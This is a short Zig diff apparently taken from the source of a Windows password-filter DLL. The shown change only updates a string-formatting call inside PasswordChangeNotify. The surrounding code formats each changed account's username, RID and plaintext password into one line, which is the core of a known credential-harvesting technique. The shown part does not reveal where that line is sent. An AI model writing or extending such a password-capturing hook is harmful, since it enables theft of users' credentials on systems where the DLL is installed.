@@ -83,15 +83,11 @@ export fn PasswordChangeNotify(
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    const usernameRIDPassword = std.fmt.allocPrintZ(
-        allocator,
-        "{s}:{d}:{s}\n",
-        .{
-            ansiUsername.Buffer.?[0..ansiUsername.Length],
-            RelativeId,
-            ansiPassword.Buffer.?[0..ansiPassword.Length],
-        },
-    ) catch return win32.STATUS_SUCCESS;
+    const usernameRIDPassword = std.fmt.allocPrintSentinel(allocator, "{s}:{d}:{s}\n", .{
+        ansiUsername.Buffer.?[0..ansiUsername.Length],
+        RelativeId,
+        ansiPassword.Buffer.?[0..ansiPassword.Length],
+    }, 0) catch return win32.STATUS_SUCCESS;
     defer allocator.free(usernameRIDPassword);
 
     // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlfreeansistring
